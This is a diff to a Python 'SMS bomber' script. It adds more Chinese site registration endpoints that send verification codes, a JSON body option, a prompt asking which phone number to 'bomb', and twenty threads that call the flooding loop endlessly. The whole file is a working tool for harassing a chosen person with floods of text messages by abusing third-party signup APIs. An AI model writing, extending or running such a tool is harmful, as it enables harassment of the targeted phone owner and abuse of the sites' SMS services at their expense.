@@ -2,6 +2,8 @@ import requests
 import json
 import time
 import random
+import _thread
+import time
 
 # post地址 post参数
 APIS = [
@@ -75,7 +77,22 @@ APIS = [
     {
         'url': 'http://www.51sxue.com/index.php',
         'body': {
-            'app': 'member', 'act': 'regPhone', 'phone': '手机号码', 'username':'456dadad'
+            'app': 'member', 'act': 'regPhone', 'phone': '手机号码', 'username': '456dadad'
+        }
+    },
+    # yespmp
+    {
+        'url': 'https://admin.yespmp.com/YespmpWeb/registerSendCode',
+        'body': {
+            'phone': '手机号码'
+        }
+    },
+    # xiezuocat
+    {
+        'url': 'https://xiezuocat.com/verify?type=signup',
+        'payload': True,
+        'body': {
+            'phone': '86-手机号码'
         }
     },
 ]
@@ -87,11 +104,14 @@ def sendSMS(API, phone):
     }
     if API.get('headers'):
         headers.update(API.get('headers'))
-    url = API.get('url').replace("手机号码", phone).replace("时间1", str(int(time.time()))).replace("时间2", str(int(time.time())))
+    url = API.get('url').replace("手机号码", phone).replace("时间1", str(int(time.time() * 1000))).replace("时间2", str(
+        int(time.time() * 1000)))
     body = API.get('body')
     try:
         if body:
             body = eval(str(body).replace("手机号码", phone)) if isinstance(body, dict) else body.replace("手机号码", phone)
+            if API.get('payload'):
+                body = json.dumps(body)
             r = requests.post(url, body, headers=headers)
         else:
             r = requests.get(url, headers=headers)
@@ -107,13 +127,54 @@ def main(phone):
     while i > 0:
         for API in APIS:
             sendSMS(API, phone)
-            # time.sleep(random.randint(1, 3))
-            time.sleep(0)
-        print(f"{time.strftime('%Y-%m-%d %H:%M:%S', time.localtime())} 第{i}轮轰炸完成！等待0秒后，开始第{i+1}轮轰炸！")
-        time.sleep(0)
+            time.sleep(random.randint(1, 3))
+        print(f"{time.strftime('%Y-%m-%d %H:%M:%S', time.localtime())} 第{i}轮轰炸完成！等待60秒后，开始第{i + 1}轮轰炸！")
+        time.sleep(3)
         i += 1
+
+# 为线程定义一个函数
+def print_time( threadName, delay,phone):
+   # count = 0
+   while True:
+      time.sleep(delay)
+      # count += 1
+      # print ("%s: %s" % ( threadName, time.ctime(time.time()) ))
+      main(phone)
+
 
 if __name__ == '__main__':
     # 手机号
-    phone = 'xxxxxxxxxxx'
-    main(phone)
+    phone = input('请输入要轰炸的手机号：')
+    # sendSMS(APIS[-1], phone)
+    
+        # 创建两个线程
+    try:
+       _thread.start_new_thread( print_time, ("Thread-1", 1,phone) )
+       _thread.start_new_thread( print_time, ("Thread-2", 1, phone) )
+       _thread.start_new_thread( print_time, ("Thread-3", 1,phone) )
+       _thread.start_new_thread( print_time, ("Thread-4", 1, phone) )
+       _thread.start_new_thread( print_time, ("Thread-5", 1,phone) )
+       _thread.start_new_thread( print_time, ("Thread-6", 1, phone) )
+       _thread.start_new_thread( print_time, ("Thread-7", 1,phone) )
+       _thread.start_new_thread( print_time, ("Thread-8", 1, phone) )
+       _thread.start_new_thread( print_time, ("Thread-9", 1,phone) )
+       _thread.start_new_thread( print_time, ("Thread-10", 1, phone) )
+       _thread.start_new_thread( print_time, ("Thread-11", 1,phone) )
+       _thread.start_new_thread( print_time, ("Thread-12", 1, phone) )
+       _thread.start_new_thread( print_time, ("Thread-13", 1,phone) )
+       _thread.start_new_thread( print_time, ("Thread-14", 1, phone) )
+       _thread.start_new_thread( print_time, ("Thread-15", 1,phone) )
+       _thread.start_new_thread( print_time, ("Thread-16", 1, phone) )
+       _thread.start_new_thread( print_time, ("Thread-17", 1,phone) )
+       _thread.start_new_thread( print_time, ("Thread-18", 1, phone) )
+       _thread.start_new_thread( print_time, ("Thread-19", 1,phone) )
+       _thread.start_new_thread( print_time, ("Thread-20", 1, phone) )
+
+    except:
+       print ("Error: 无法启动线程")
+
+    while 1:
+       pass
+    
+    
+    # main(phone)
